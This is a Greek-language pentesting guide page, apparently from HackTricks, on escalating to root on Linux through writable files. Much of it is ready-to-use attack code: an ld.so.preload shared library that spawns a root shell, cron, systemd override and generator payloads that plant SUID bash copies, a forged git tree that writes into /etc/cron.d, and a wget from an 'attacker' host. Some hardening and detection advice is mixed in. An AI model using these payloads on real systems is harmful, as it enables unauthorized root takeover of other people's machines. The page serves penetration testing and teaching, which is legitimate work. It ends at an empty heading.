# Εγγραφή αυθαίρετου αρχείου ως root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

Το `/etc/ld.so.preload` είναι μια λίστα σε επίπεδο συστήματος με κοινόχρηστα αντικείμενα που ο dynamic linker φορτώνει πριν από άλλα κοινόχρηστα αντικείμενα. Η λειτουργία ασφαλούς εκτέλεσης εφαρμόζει πρόσθετους περιορισμούς στο preloading, επομένως μια διαδρομή βιβλιοθήκης όπως η `/tmp/pe.so` δεν αποτελεί καθολική τεχνική για SUID binaries.\
Αν μπορείτε να δημιουργήσετε ή να τροποποιήσετε αυτό το αρχείο, μια διεργασία που το φορτώνει θα φορτώσει την αναφερόμενη βιβλιοθήκη πριν από τα άλλα κοινόχρηστα αντικείμενά της, επιτρέποντας την εκτέλεση κώδικα στο πλαίσιο αυτής της διεργασίας.<sup>[[12]](#references)</sup>

Για παράδειγμα: `echo "/tmp/pe.so" > /etc/ld.so.preload`

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unlink("/etc/ld.so.preload");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

### Έξοδος OCR ως περιορισμένη εγγραφή αρχείου

Μια υπηρεσία OCR που επιτρέπει στον καλούντα να επιλέξει το όνομα του αποθηκευμένου αρχείου μπορεί να μετατρέψει το αναγνωρισμένο κείμενο εικόνας σε primitive **περιορισμένης εγγραφής αρχείου**. Τα αποθηκευμένα bytes είναι το αναγνωρισμένο κείμενο, όχι τα bytes της εικόνας, γι’ αυτό ελέγξτε την έξοδο OCR για συντακτικά σφάλματα. Αν ο επιτρεπόμενος προορισμός εκτελεί web περιεχόμενο και δέχεται όνομα αρχείου `.php`, αυτό το κείμενο μπορεί να εκτελεστεί όταν ζητηθεί. Στο MakeSense, μια τοπικά προσβάσιμη εφαρμογή OCR αποθήκευε το κείμενο στο `/saved/`· ο PHP server της, που εκτελούνταν ως root, εκτελούσε έπειτα το αποθηκευμένο αρχείο ως root. Η εγγραφή περιοριζόταν σε αυτόν τον κατάλογο, χωρίς να έχει αποδειχθεί path traversal.<sup>[[37]](#references)</sup>

Το προνόμιο που αποκτάται κατά την εκτέλεση είναι αυτό της **διεργασίας που εξυπηρετεί την PHP**, όχι αυτόματα του χρήστη που εκτελεί την εγγραφή OCR. Επιβεβαιώστε τη χαρτογράφηση εκτέλεσης του προορισμού και την ταυτότητα της διεργασίας κατά τον χρόνο εκτέλεσης· ένας OCR writer με δικαιώματα root σε συνδυασμό με έναν μη προνομιούχο web server δεν θα έκανε την PHP να εκτελεστεί ως root.<sup>[[37]](#references)</sup> Συγκρίνετε με το άμεσο [μοτίβο μεταφόρτωσης στο web root](../../pentesting-web/file-upload/).

### Git hooks

Τα **Git hooks** είναι εκτελέσιμα scripts που εκτελούνται σε συμβάντα ενός αποθετηρίου, όπως οι λειτουργίες commit και merge. Αν ένα **προνομιούχο script ή ένας προνομιούχος χρήστης** εκτελεί αυτές τις ενέργειες και ένας attacker μπορεί να **γράψει στον φάκελο `.git`**, το hook μπορεί να χρησιμοποιηθεί για **privilege escalation**.<sup>[[13]](#references)</sup>

Για παράδειγμα, είναι δυνατό να **δημιουργηθεί ένα script** σε ένα git repo, μέσα στο **`.git/hooks`**, ώστε να εκτελείται πάντα όταν δημιουργείται ένα νέο commit:

```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/0xdf' > pre-commit
chmod +x pre-commit
```

### Path traversal κατά την εξαγωγή Git tree με προνόμια

Ένας προνομιούχος συγχρονιστής μπορεί να παρακάμψει το checkout και, αντί γι' αυτό, να απαριθμήσει ένα repository που επηρεάζεται από τον attacker με `git ls-tree`, να διαβάσει κάθε blob με `git cat-file`, να ενώσει το αναφερόμενο pathname με έναν staging directory και να γράψει ο ίδιος τα δεδομένα. Αυτό οδηγεί σε **arbitrary file write με τα προνόμια του συγχρονιστή**, όταν συνδυάζει το `-c safe.directory=*` (απενεργοποιώντας τον έλεγχο του Git για repository με διαφορετικό owner) με την απουσία ελέγχου περιορισμού του προορισμού. Ένα απόλυτο όνομα tree-entry κάνει την Python `os.path.join(stage, name)` να απορρίπτει το `stage`· ένα σχετικό όνομα που περιέχει `../` διαφεύγει όταν το filesystem επιλύει τη διαδρομή. Επειδή η εφαρμογή υλοποιεί το raw tree αντί να ζητήσει από το Git να κάνει checkout, η απόρριψη pathname κατά το checkout δεν προστατεύει ποτέ το sink.<sup>[[30]](#references)[[32]](#references)[[33]](#references)</sup>

Αναζητήστε αυτή τη μορφή κώδικα σε root services, timers, deployment agents, template importers και εργασίες backup/restore:<sup>[[30]](#references)</sup>

```python
entries = git("-c", "safe.directory=*", "ls-tree", "-rz", "HEAD")
for mode, oid, git_path in parse(entries):
    target = os.path.join(stage_root, git_path)  # no containment check
    os.makedirs(os.path.dirname(target), exist_ok=True)
    with open(target, "wb") as output:
        output.write(git("cat-file", "blob", oid))
```

Μια εγγραφή tree κωδικοποιείται ως `<mode> SP <name> NUL <raw object ID>`. Η επιλογή `git hash-object --literally` επιτρέπει σκόπιμα δεδομένα αντικειμένων που μπορεί να απορρίψει η κανονική ανάλυση ή το `git fsck`, επομένως ένα προσωρινό clone μπορεί να δημιουργήσει ένα tree του οποίου το όνομα αρχείου είναι απόλυτος προορισμός. Αυτό το παράδειγμα δημιουργεί ένα blob αρχείου cron, περιτυλίγει το κατασκευασμένο tree σε ένα commit και μετακινεί ένα branch σε αυτό· η εκμετάλλευση εξακολουθεί να απαιτεί άδεια ενημέρωσης ενός repository που χρησιμοποιείται από την προνομιούχα εργασία και έναν Git server που αποδέχεται το κακοσχηματισμένο αντικείμενο.<sup>[[30]](#references)[[31]](#references)</sup>

```bash
blob=$(printf '%s\n' '* * * * * root cp /bin/bash /tmp/rootbash && chmod 6755 /tmp/rootbash' | git hash-object -w --stdin)
{ printf '100644 /etc/cron.d/git-sync\0'; printf '%s' "$blob" | xxd -r -p; } > tree.raw
tree=$(git hash-object -w -t tree --literally --stdin < tree.raw)
commit=$(printf 'crafted tree\n' | git commit-tree "$tree")
git update-ref refs/heads/main "$commit"
git ls-tree -r main
git push --force origin main
```

Η θωράκιση πρέπει να καλύπτει τόσο την εισαγωγή αποθετηρίων όσο και την τελική λειτουργία στο filesystem:<sup>[[30]](#references)[[33]](#references)[[34]](#references)</sup>

- Αντικαταστήστε το `safe.directory=*` με τα ακριβή αποθετήρια που πρέπει να εμπιστεύεται η υπηρεσία και, όπου είναι δυνατό, εκτελέστε την επεξεργασία αποθετηρίων χωρίς προνόμια root.
- Απορρίψτε τα απόλυτα ονόματα και κάθε στοιχείο `.` ή `..` πριν από την υλοποίηση. Μετά τη συνένωση των διαδρομών, κανονικοποιήστε τη διαδρομή και επαληθεύστε ότι ο προορισμός παραμένει κάτω από τον προβλεπόμενο ριζικό κατάλογο.
- Αποφύγετε τις συνθήκες ανταγωνισμού symlink τύπου check-then-open: ανοίξτε σε σχέση με έναν έμπιστο descriptor καταλόγου και, στο Linux, χρησιμοποιήστε `openat2()` με `RESOLVE_BENEATH` και `RESOLVE_NO_SYMLINKS` για διαδρομές που ελέγχονται από attacker.
- Προτιμήστε ένα κανονικό checkout σε απομονωμένο κατάλογο αντί να επανυλοποιήσετε το checkout από έξοδο plumbing. Αν απαιτείται εισαγωγή raw-object, ενεργοποιήστε επικύρωση στην πλευρά λήψης, όπως `receive.fsckObjects=true`· μην υποβαθμίζετε τα ευρήματα `receive.fsck.*` που σχετίζονται με ονόματα διαδρομών και απαιτούνται για την απόρριψη κακόβουλα κατασκευασμένων δέντρων.

### Ανάπτυξη προνομιακών ρυθμίσεων

Ορισμένες υπηρεσίες διαχείρισης αποθηκεύουν την επιδιωκόμενη κατάσταση του συστήματος σε ένα αρχείο ρυθμίσεων και αργότερα την αναπτύσσουν με αυξημένα προνόμια. Για παράδειγμα, το [openmediavault αποθηκεύει τις ρυθμίσεις στο `/etc/openmediavault/config.xml`](https://docs.openmediavault.org/en/7.x/faq.html), ενώ η [διεπαφή RPC](https://docs.openmediavault.org/en/8.x/development/tools/omv_rpc.html) μπορεί να εφαρμόζει αλλαγές υπηρεσιών. Αν ένας λογαριασμός με χαμηλότερα προνόμια μπορεί να γράψει ή να αντικαταστήσει αυτό το αρχείο, εξετάστε αν μπορεί επίσης να ζητήσει εξουσιοδοτημένη ανάπτυξη και αν το επιλεγμένο module χρησιμοποιεί το τροποποιημένο πεδίο ως root. Τα κλειδιά λογαριασμών SSH, οι προγραμματισμένες εντολές και η εγκατάσταση πακέτων έχουν διαφορετικές προϋποθέσεις· η απλή παρουσία ενός αρχείου ή η δυνατότητα εγγραφής σε ένα αρχείο XML δεν αποδεικνύει τίποτα από αυτά. Ελέγξτε τα δικαιώματα του αρχείου και του γονικού καταλόγου, τις ομάδες του καλούντος και την εξουσιοδότηση RPC, την εγκατεστημένη έκδοση και τον πραγματικό καταναλωτή, χωρίς να τροποποιήσετε τις ρυθμίσεις ή να εκτελέσετε λειτουργία εφαρμογής κατά την απογραφή.

Οι ορισμοί ενεργειών του Fail2Ban στο `/etc/fail2ban/action.d/` αποτελούν ένα ακόμη όριο προνομιακών ρυθμίσεων. Ένας χρήστης που μπορεί να γράψει και να αναζητήσει σε αυτόν τον κατάλογο ενδέχεται να μπορεί να αντικαταστήσει έναν ορισμό ενέργειας ή να προσθέσει μια παράκαμψη, αλλά τα δικαιώματα του καταλόγου από μόνα τους δεν αποδεικνύουν εκτέλεση κώδικα. Επιβεβαιώστε ότι ένα ενεργοποιημένο jail επιλέγει πράγματι την επηρεαζόμενη ενέργεια, ότι η υπηρεσία Fail2Ban την εκτελεί με αυξημένα προνόμια και ότι θα πραγματοποιηθούν εξουσιοδοτημένη επαναφόρτωση/επανεκκίνηση και ένα συμβάν ban που πληροί τις προϋποθέσεις. Μια άσχετη άδεια sudo για επανεκκίνηση του Fail2Ban είναι σχετική μόνο αν αφορά ακριβώς την εντολή της υπηρεσίας και έχει φορτωθεί ο τροποποιημένος ορισμός. Η [ρύθμιση ενεργειών του Fail2Ban](https://github.com/fail2ban/fail2ban/blob/master/man/jail.conf.5) τεκμηριώνει τη σχέση μεταξύ του καταλόγου ενεργειών και των jail· το [παράδειγμα ενέργειας](https://github.com/fail2ban/fail2ban/blob/master/config/action.d/iptables.conf) δείχνει ότι το `actionban` εκτελείται κατά το ban με τα δικαιώματα του χρήστη της υπηρεσίας. Εξετάστε τα δικαιώματα και την ενεργή ρύθμιση χωρίς να αλλάξετε ενέργειες ή να προκαλέσετε ban κατά την απογραφή.

Ένα ξεχωριστό όριο υπάρχει όταν ένα ενεργοποιημένο jail του Fail2Ban χρησιμοποιεί ενέργεια mail με εμπλουτισμό WHOIS. Το [CVE-2021-32749](https://github.com/fail2ban/fail2ban/security/advisories/GHSA-m985-3f3v-cwmm) αφορούσε μη έμπιστο κείμενο WHOIS που διοχετευόταν στο `mail` του GNU mailutils, του οποίου η επεξεργασία escape μπορούσε να εκτελέσει μια εντολή. Ένας χρήστης με χαμηλότερα προνόμια που μπορεί να γράψει σε αρχεία ενδέχεται να επηρεάσει την απόκριση αν μπορεί να αλλάξει το αρχείο ρυθμίσεων παράκαμψης διακομιστή του **επιλεγμένου WHOIS client**· το [`whois.conf(5)` του Debian](https://manpages.debian.org/bookworm/whois/whois.conf.5.en.html) τεκμηριώνει ένα τέτοιο αρχείο, αλλά η διαδρομή και η χρήση του διαφέρουν ανά εγκατάσταση. Εξετάστε το ενεργό jail/την ενέργεια, την ταυτότητα της υπηρεσίας, τον πραγματικό WHOIS client και τη διαδρομή του αρχείου ρυθμίσεών του, την υλοποίηση mail, τη δυνατότητα ελέγχου της απόκρισης και τη διόρθωση ή μεταφορά της διόρθωσης από τον προμηθευτή που έχει εγκατασταθεί. Ένα εγγράψιμο αρχείο ρυθμίσεων WHOIS, μια έκδοση του Fail2Ban ή μια ενέργεια mail από μόνα τους δεν αποδεικνύουν αυτή την αλυσίδα· αποφύγετε ερωτήματα σε εξωτερικό διακομιστή ή την πρόκληση ban κατά την παθητική απογραφή.

### Δημιουργία αρχείων μέσω TFTP και προνομιακά hooks πακέτων

Μια προσβάσιμη υπηρεσία TFTP μπορεί να διασχίσει το όριο ενός container ή ενός τοπικού χρήστη όταν οι **ενεργές** ρυθμίσεις του tftpd-hpa εκτελούνται ως root, εκθέτουν το filesystem root ως κατάλογο `--secure` και ενεργοποιούν το `--create`. Το [εγχειρίδιο του tftpd-hpa](https://manpages.debian.org/trixie/tftpd-hpa/tftpd.8.en.html) περιγράφει τις επιλογές δημιουργίας αρχείων και χρήστη. Αυτό μπορεί να επιτρέψει τη δημιουργία νέου αρχείου σε προνομιακό κατάλογο ρυθμίσεων, όπως το `/etc/apt/apt.conf.d/`· ωστόσο, ένα υπάρχον αρχείο μπορεί να μην επιδέχεται αντικατάσταση. Το [εγχειρίδιο ρυθμίσεων του APT](https://manpages.debian.org/bookworm/apt/apt.conf.5.en.html) τεκμηριώνει τις εντολές `APT::Update::Pre-Invoke`. Μια εκτέλεση `apt update` ως root μπορεί να γίνει ο καταναλωτής με υψηλότερα προνόμια **μόνο αν** διαβάσει το νέο αρχείο ρυθμίσεων. Επιβεβαιώστε τα πραγματικά ορίσματα και την ταυτότητα της εκτελούμενης υπηρεσίας, την προσβασιμότητα μέσω δικτύου και τα φίλτρα, την πολιτική δημιουργίας στον κατάλογο-στόχο, το ενεργό εύρος των ρυθμίσεων του APT και μια μεταγενέστερη προνομιακή εκτέλεση. Ένα προεπιλεγμένο αρχείο, ένας εγγράψιμος κατάλογος-στόχος ή μια προγραμματισμένη εντολή APT από μόνα τους δεν αποδεικνύουν όλη την αλυσίδα. Η παθητική αρχική διερεύνηση πρέπει να διαβάζει μόνο περιορισμένης έκτασης τοπικές ρυθμίσεις και μεταδεδομένα, χωρίς μεταφόρτωση αρχείου ή εκτέλεση του APT.

### Αρχεία Cron και χρόνου

Αν μπορείτε να **γράψετε σε αρχεία που σχετίζονται με το cron και εκτελούνται από τον root**, συνήθως μπορείτε να πετύχετε εκτέλεση κώδικα την επόμενη φορά που θα εκτελεστεί η εργασία. Ενδιαφέροντες στόχοι είναι οι εξής:<sup>[[14]](#references)[[20]](#references)</sup>

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- Το crontab του ίδιου του root στο `/var/spool/cron/` ή στο `/var/spool/cron/crontabs/`
- Χρονοδιακόπτες `systemd` και οι υπηρεσίες που ενεργοποιούν

Γρήγοροι έλεγχοι:

```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```

Συνήθεις διαδρομές κατάχρησης:

- **Προσθήκη νέας cron job για root** στο `/etc/crontab` ή σε ένα αρχείο στο `/etc/cron.d/`
- **Αντικατάσταση ενός script** που εκτελείται ήδη από το `run-parts`
- **Τοποθέτηση backdoor σε έναν υπάρχοντα timer target** τροποποιώντας το script ή το binary που εκκινεί

Ελάχιστο παράδειγμα cron payload:

```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```

Αν μπορείς να γράψεις μόνο σε έναν κατάλογο cron που χρησιμοποιείται από το run-parts, άφησε εκεί ένα εκτελέσιμο αρχείο:

```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```

Σημειώσεις:

- Το `run-parts` συνήθως αγνοεί ονόματα αρχείων που περιέχουν τελείες, επομένως προτίμησε ονόματα όπως `backup` αντί για `backup.sh`.<sup>[[15]](#references)</sup>
- Ορισμένα συστήματα χρησιμοποιούν `systemd` timers αντί για το κλασικό cron, αλλά η ιδέα της κατάχρησης είναι η ίδια: **τροποποίησε αυτό που θα εκτελέσει αργότερα ο root**.<sup>[[20]](#references)</sup>

### Αρχεία υπηρεσιών και socket

Αν μπορείς να γράψεις **αρχεία μονάδων `systemd`** ή αρχεία στα οποία αναφέρονται, ενδέχεται να μπορέσεις να εκτελέσεις κώδικα ως root κάνοντας reload και restart της μονάδας ή περιμένοντας να ενεργοποιηθεί μέσω της υπηρεσίας/socket.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)</sup>

Έλεγξε επίσης αν υπάρχει δικαίωμα εγγραφής και αναζήτησης στον ίδιο τον κατάλογο μονάδων του συστήματος, συμπεριλαμβανομένων των ACL: ένας χρήστης μπορεί να δημιουργήσει νέα μονάδα στο `/etc/systemd/system` ακόμη κι όταν δεν επιτρέπεται η ανάγνωση ή η εμφάνιση των περιεχομένων του καταλόγου. Αυτή η διαδρομή από μόνη της δεν ξεκινά τίποτα. Επιβεβαίωσε ότι ο system manager θα φορτώσει τη νέα μονάδα, ότι ο χρήστης διαθέτει αποτελεσματική άδεια `systemctl start` ή `restart` με δυνατότητα root για το όνομά της (ή άλλη προνομιακή διαδρομή ενεργοποίησης) και ότι η υπηρεσία εκτελείται με την προβλεπόμενη ταυτότητα. Μια υπάρχουσα μονάδα που έχει ήδη φορτωθεί και τροποποιήθηκε στον δίσκο ενδέχεται να χρειάζεται `daemon-reload`· μια νέα μονάδα με διαφορετικό όνομα φορτώνεται με διαφορετικό τρόπο. Έλεγξε τα ακριβή ορίσματα και τις εξαιρέσεις του sudo πριν θεωρήσεις επαρκή έναν κανόνα restart με wildcard. Δες τη [διαδρομή αναζήτησης μονάδων systemd](https://www.freedesktop.org/software/systemd/man/latest/systemd.unit.html) και τη [σημασιολογία φόρτωσης και reload του systemctl](https://www.freedesktop.org/software/systemd/man/latest/systemctl.html).

Ενδιαφέροντες στόχοι περιλαμβάνουν:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- Drop-in overrides στο `/etc/systemd/system/<unit>.d/*.conf`
- Scripts/εκτελέσιμα υπηρεσιών στα οποία αναφέρονται τα `ExecStart=`, `ExecStartPre=`, `ExecStartPost=`
- Εγγράψιμες διαδρομές `EnvironmentFile=` που φορτώνονται από υπηρεσία root

Γρήγοροι έλεγχοι:

```bash
ls -la /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
```

Συνήθεις τρόποι κατάχρησης:

- **Αντικατάσταση του `ExecStart=`** σε ένα service unit που ανήκει στο root και μπορείς να τροποποιήσεις
- **Προσθήκη ενός drop-in override** με κακόβουλο `ExecStart=` και πρώτα εκκαθάριση της παλιάς τιμής
- **Τοποθέτηση backdoor στο script/binary** που ήδη αναφέρεται από το unit
- **Παραβίαση μιας socket-activated υπηρεσίας** τροποποιώντας το αντίστοιχο αρχείο `.service` που εκκινείται όταν το socket λαμβάνει μια σύνδεση

Παράδειγμα κακόβουλου override:

```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```

Τυπική ροή ενεργοποίησης:

```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```

Αν δεν μπορείτε να επανεκκινήσετε μόνοι σας τις υπηρεσίες, αλλά μπορείτε να επεξεργαστείτε ένα socket-activated unit, ίσως αρκεί να **περιμένετε μια σύνδεση πελάτη** για να ενεργοποιηθεί η εκτέλεση της backdoored υπηρεσίας ως root.<sup>[[17]](#references)</sup>

### Κατάλογοι systemd generator

Οι **System generators** είναι εκτελέσιμα αρχεία που εκκινεί ο system manager πριν φορτώσει τα unit files, τόσο κατά την εκκίνηση όσο και κατά την επαναφόρτωση της διαμόρφωσης. Επομένως, η δυνατότητα εγγραφής σε έναν κατάλογο system generator (ή σε ένα υπάρχον εκτελέσιμο generator) παρέχει άμεσα τη δυνατότητα εκτέλεσης κώδικα ως root, κάτι που είναι εύκολο να παραβλεφθεί όταν ένας έλεγχος εξετάζει μόνο αρχεία `*.service` και `*.timer`.<sup>[[35]](#references)[[36]](#references)</sup>

Η συνήθης σειρά αναζήτησης είναι `/run/systemd/system-generators/`, `/etc/systemd/system-generators/`, `/usr/local/lib/systemd/system-generators/` και `/usr/lib/systemd/system-generators/` (ορισμένες διανομές διαθέτουν το `/lib/systemd/system-generators/` μέσω της συγχώνευσης του `/usr`). Ένα εκτελέσιμο με το ίδιο όνομα σε έναν προηγούμενο κατάλογο υπερισχύει του μεταγενέστερου. Μην συγχέετε αυτούς τους **καταλόγους εκτελέσιμων εισόδου** με τους `/run/systemd/generator`, `/run/systemd/generator.early` και `/run/systemd/generator.late`, οι οποίοι περιέχουν προσωρινά unit αρχεία εξόδου που παράγονται από generators.<sup>[[35]](#references)</sup>

Γρήγοροι έλεγχοι:

```bash
for d in /run/systemd/system-generators /etc/systemd/system-generators \
         /usr/local/lib/systemd/system-generators /usr/lib/systemd/system-generators \
         /lib/systemd/system-generators; do
    [ -e "$d" ] || continue
    namei -l "$d"
    find "$d" -maxdepth 1 -writable -ls 2>/dev/null
    getfacl -p "$d" "$d"/* 2>/dev/null
done
```

Ένα generator που δημιουργείται πρόσφατα πρέπει να έχει ορισμένο το executable bit. Αν το write primitive ελέγχει τα bytes αλλά όχι το mode, στόχευσε έναν generator που είναι ήδη εκτελέσιμος· η περικοπή του επί τόπου συνήθως διατηρεί τα metadata του. Αν ο ίδιος ο κατάλογος είναι εγγράψιμος, δημιούργησε μια νέα εγγραφή και όρισέ την ως εκτελέσιμη.<sup>[[35]](#references)</sup>

```bash
cat > /etc/systemd/system-generators/zz-update <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown 0:0 /tmp/rootbash
chmod 4755 /tmp/rootbash
rm -f "$0"
EOF
chmod 755 /etc/systemd/system-generators/zz-update
```

Η εκτέλεση του `systemctl daemon-reload` στον **system** manager απαιτεί κατάλληλη εξουσιοδότηση, αλλά εκτελεί ξανά όλους τους system generators· διαφορετικά, περιμένετε για προνομιακή επαναφόρτωση, λειτουργία πακέτου ή επανεκκίνηση. Οι κατάλογοι user-generator, όπως ο `~/.config/systemd/user-generators/`, εκτελούνται από τον user manager και **δεν παρέχουν από μόνοι τους πρόσβαση root**.<sup>[[35]](#references)</sup>

Για hardening και εντοπισμό απειλών, επαληθεύετε κάθε στοιχείο της διαδρομής και τα ACL, όχι μόνο τα τελικά mode bits, ορίστε baseline για τα hashes και την ιδιοκτησία πακέτου των generators και ειδοποιηθείτε για δημιουργία, μετονομασία, αλλαγές περιεχομένου ή δικαιωμάτων σε όλους τους καταλόγους εισόδου των system generators. Είναι σημαντικό να παρακολουθείτε την εγγραφή, επειδή ένας one-shot generator μπορεί να διαγραφεί μετά την εκτέλεσή του, ενώ το παραγόμενο unit tree κάτω από το `/run/systemd/generator*` αναδημιουργείται στην επόμενη επαναφόρτωση.<sup>[[35]](#references)[[36]](#references)</sup>

### Αντικατάσταση ενός περιοριστικού `php.ini` που χρησιμοποιεί ένα προνομιακό PHP sandbox

Ορισμένοι προσαρμοσμένοι daemons επικυρώνουν PHP που παρέχεται από τον χρήστη, εκτελώντας το `php` με ένα **περιοριστικό `php.ini`** (για παράδειγμα, `disable_functions=exec,system,...`). Αν ο κώδικας μέσα στο sandbox εξακολουθεί να διαθέτει **οποιονδήποτε primitive εγγραφής** (όπως το `file_put_contents`) και μπορείτε να αποκτήσετε πρόσβαση στην **ακριβή διαδρομή `php.ini`** που χρησιμοποιεί ο daemon, μπορείτε να **αντικαταστήσετε αυτήν τη ρύθμιση** για να άρετε τους περιορισμούς και, στη συνέχεια, να υποβάλετε ένα δεύτερο payload που εκτελείται με αυξημένα προνόμια.<sup>[[2]](#references)</sup>

Τυπική ροή:

1. Το πρώτο payload αντικαθιστά τη ρύθμιση του sandbox.
2. Το δεύτερο payload εκτελεί κώδικα, τώρα που έχουν ενεργοποιηθεί ξανά οι επικίνδυνες συναρτήσεις.

Ελάχιστο παράδειγμα (αντικαταστήστε τη διαδρομή που χρησιμοποιεί ο daemon):

```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```

Αν ο daemon εκτελείται ως root (ή επικυρώνει με διαδρομές που ανήκουν στον root), η δεύτερη εκτέλεση αποκτά context root. Αυτό είναι ουσιαστικά **privilege escalation μέσω overwrite του config** όταν το sandboxed runtime εξακολουθεί να μπορεί να γράφει αρχεία.

### binfmt_misc

Το `binfmt_misc` εκθέτει registrations στο `/proc/sys/fs/binfmt_misc`· κάθε registration συσχετίζει ένα μοτίβο τύπου αρχείου με έναν interpreter. Ο αντίκτυπος στα προνόμια εξαρτάται από το ποιος μπορεί να αλλάξει το registration και ποια διεργασία εκτελεί αργότερα το αρχείο που αντιστοιχεί σε αυτό, επομένως επαληθεύστε αυτές τις προϋποθέσεις πριν θεωρήσετε ότι πρόκειται για διαδρομή privilege escalation.<sup>[[21]](#references)</sup>

Ένα εκτελέσιμο helper με `CAP_DAC_OVERRIDE` μπορεί να παρέχει ξεχωριστή διαδρομή registration, αν δέχεται δεδομένα που ελέγχει ο caller και τα γράφει στο `/proc/sys/fs/binfmt_misc/register`, ακόμη κι όταν ο caller δεν μπορεί να γράψει απευθείας σε αυτό το node. Εξετάστε τη συμπεριφορά του helper ως προς την είσοδο και την εγγραφή, χωρίς να το εκτελέσετε κατά την απογραφή. Αν ένας καταχωρισμένος κανόνας χρησιμοποιεί το flag `C`, ο interpreter λαμβάνει credentials βάσει του binary που αντιστοιχίστηκε· συνεπώς, ένα SUID match που ανήκει στον root μπορεί να εκτελέσει ως root έναν interpreter που ελέγχει ο caller. Επιβεβαιώστε το mount και την πολιτική registration του `binfmt_misc`, το effective capability του helper, τον ακριβή κανόνα και τη διαδρομή του interpreter, τον εκτελέσιμο στόχο SUID, καθώς και αν το `no_new_privs` ή ένα mount `nosuid` καταστέλλει τη μετάβαση SUID. Ένα capability bit ή μια ενσωματωμένη συμβολοσειρά διαδρομής από μόνα τους αποτελούν μόνο ένδειξη για περαιτέρω έλεγχο.<sup>[[21]](#references)</sup> Δείτε το [execve(2)](https://man7.org/linux/man-pages/man2/execve.2.html) για τις συνθήκες καταστολής του SUID.

### Overwrite χειριστών schema (όπως http: ή https:)

Τα desktop environments χρησιμοποιούν συσχετίσεις MIME και desktop entries για να επιλέξουν εφαρμογή για URI schemes· ένας attacker που μπορεί να γράψει στους σχετικούς καταλόγους διαμόρφωσης ανά χρήστη και desktop-entry μπορεί να ανακατευθύνει αυτά τα schemes σε ένα launcher που ελέγχει. Τροποποιώντας το αρχείο `$HOME/.config/mimeapps.list` ώστε οι χειριστές URL HTTP και HTTPS να δείχνουν σε ένα κακόβουλο αρχείο (για παράδειγμα, `x-scheme-handler/http=evil.desktop` και `x-scheme-handler/https=evil.desktop`), ένα κλικ του χρήστη μπορεί να εκκινήσει αυτό το desktop entry.<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>

```bash
[Desktop Entry]
Type=Application
Name=Evil Desktop Entry
Exec=/bin/sh -c "id > /tmp/mime-handler-pwned"
MimeType=x-scheme-handler/http;x-scheme-handler/https;
```

### Το Root εκτελεί scripts/binaries που μπορούν να τροποποιηθούν από τον χρήστη

Αν μια privileged ροή εργασιών εκτελεί κάτι όπως `/bin/sh /home/username/.../script` (ή οποιοδήποτε binary μέσα σε έναν κατάλογο που ανήκει σε μη προνομιούχο χρήστη), μπορείς να την υποκλέψεις:<sup>[[1]](#references)</sup>

- **Εντοπισμός της εκτέλεσης:** παρακολούθησε τις διεργασίες με το pspy για να εντοπίσεις το root να καλεί paths που ελέγχονται από τον χρήστη.<sup>[[25]](#references)</sup>

```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```

- **Επιβεβαιώστε τη δυνατότητα εγγραφής:** βεβαιωθείτε ότι τόσο το αρχείο-στόχος όσο και ο κατάλογός του ανήκουν στον χρήστη σας και είναι εγγράψιμα από αυτόν.
- **Κάντε hijack τον στόχο:** κρατήστε αντίγραφο ασφαλείας του αρχικού binary/script και τοποθετήστε ένα payload που δημιουργεί ένα SUID shell (ή εκτελεί οποιαδήποτε άλλη ενέργεια ως root) και, στη συνέχεια, επαναφέρετε τα permissions:

```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```

- **Ενεργοποιήστε την προνομιούχα ενέργεια** (π.χ. πατώντας ένα κουμπί UI που εκκινεί το helper). Όταν το root εκτελέσει ξανά τη hijacked διαδρομή, αποκτήστε το κλιμακωμένο shell με `./rootshell -p`.

### Τροποποίηση αρχείων μόνο στην page cache προνομιούχων binaries

